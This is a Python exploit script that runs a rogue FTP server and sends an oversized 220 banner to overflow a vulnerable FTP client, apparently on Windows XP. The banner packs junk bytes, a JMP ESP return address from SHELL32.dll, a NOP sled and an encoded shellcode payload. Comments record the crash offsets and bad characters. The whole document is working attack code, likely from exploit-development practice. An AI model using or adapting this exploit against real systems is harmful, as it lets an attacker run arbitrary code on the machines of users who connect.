import socket

host = "0.0.0.0"
port = 21

# Application crashes at: 1000 bytes input

eip_offset = 989
junk_data = bytearray(b"A" * eip_offset)
return_address = bytearray(b"\xeb\x30\x9d\x7c")
num_nop_bytes = 100
nop_sled = bytearray(b"\x90" * num_nop_bytes)
shell_code = (
    b"\xba\x76\xbb\xb7\x07\xdd\xc0\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
    b"\x53\x83\xee\xfc\x31\x56\x0e\x03\x20\xb5\x55\xf2\x30\x21\x1b"
    b"\xfd\xc8\xb2\x7c\x77\x2d\x83\xbc\xe3\x26\xb4\x0c\x67\x6a\x39"
    b"\xe6\x25\x9e\xca\x8a\xe1\x91\x7b\x20\xd4\x9c\x7c\x19\x24\xbf"
    b"\xfe\x60\x79\x1f\x3e\xab\x8c\x5e\x07\xd6\x7d\x32\xd0\x9c\xd0"
    b"\xa2\x55\xe8\xe8\x49\x25\xfc\x68\xae\xfe\xff\x59\x61\x74\xa6"
    b"\x79\x80\x59\xd2\x33\x9a\xbe\xdf\x8a\x11\x74\xab\x0c\xf3\x44"
    b"\x54\xa2\x3a\x69\xa7\xba\x7b\x4e\x58\xc9\x75\xac\xe5\xca\x42"
    b"\xce\x31\x5e\x50\x68\xb1\xf8\xbc\x88\x16\x9e\x37\x86\xd3\xd4"
    b"\x1f\x8b\xe2\x39\x14\xb7\x6f\xbc\xfa\x31\x2b\x9b\xde\x1a\xef"
    b"\x82\x47\xc7\x5e\xba\x97\xa8\x3f\x1e\xdc\x45\x2b\x13\xbf\x01"
    b"\x98\x1e\x3f\xd2\xb6\x29\x4c\xe0\x19\x82\xda\x48\xd1\x0c\x1d"
    b"\xae\xc8\xe9\xb1\x51\xf3\x09\x98\x95\xa7\x59\xb2\x3c\xc8\x31"
    b"\x42\xc0\x1d\xaf\x4a\x67\xce\xd2\xb7\xd7\xbe\x52\x17\xb0\xd4"
    b"\x5c\x48\xa0\xd6\xb6\xe1\x49\x2b\x39\x78\xba\xa2\xdf\xe8\xaa"
    b"\xe2\x48\x84\x08\xd1\x40\x33\x72\x33\xf9\xd3\x3b\x55\x3e\xdc"
    b"\xbb\x73\x68\x4a\x30\x90\xac\x6b\x47\xbd\x84\xfc\xd0\x4b\x45"
    b"\x4f\x40\x4b\x4c\x27\xe1\xde\x0b\xb7\x6c\xc3\x83\xe0\x39\x35"
    b"\xda\x64\xd4\x6c\x74\x9a\x25\xe8\xbf\x1e\xf2\xc9\x3e\x9f\x77"
    b"\x75\x65\x8f\x41\x76\x21\xfb\x1d\x21\xff\x55\xd8\x9b\xb1\x0f"
    b"\xb2\x70\x18\xc7\x43\xbb\x9b\x91\x4b\x96\x6d\x7d\xfd\x4f\x28"
    b"\x82\x32\x18\xbc\xfb\x2e\xb8\x43\xd6\xea\xc8\x09\x7a\x5a\x41"
    b"\xd4\xef\xde\x0c\xe7\xda\x1d\x29\x64\xee\xdd\xce\x74\x9b\xd8"
    b"\x8b\x32\x70\x91\x84\xd6\x76\x06\xa4\xf2"
)

bufferInput = junk_data + return_address + nop_sled + shell_code

def sendBanner(bufferInput, conn):
    prefix = bytearray("220 ".encode("ascii"))
    suffix = bytearray("\r\n".encode("ascii"))

    exploitInput = prefix + bufferInput + suffix
    conn.send(exploitInput)


def startServer(host, port, bufferInput):
    print("[+] Server Starting...")
    ssocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssocket.bind((host, port))
    ssocket.listen()

    conn, _ = ssocket.accept()
    print(f"[+] Sending buffer...")
    sendBanner(bufferInput, conn)
    conn.close()
    exit()

startServer(host, port, bufferInput)



# Comments:
# EIP at crash: 0x30684239 (offset 989)
# ESP at crash: 00EDF018 -> 42316842 (offset 993)
# ESP points just after return address.
# We can use `JMP ESP` instruction.
# Bad Characters: 0x00, 0x0a, 0x0d

# 0x7c9d30eb : jmp esp |  {PAGE_EXECUTE_READ} [SHELL32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v6.00.2900.5512 (C:\WINDOWS\system32\SHELL32.dll)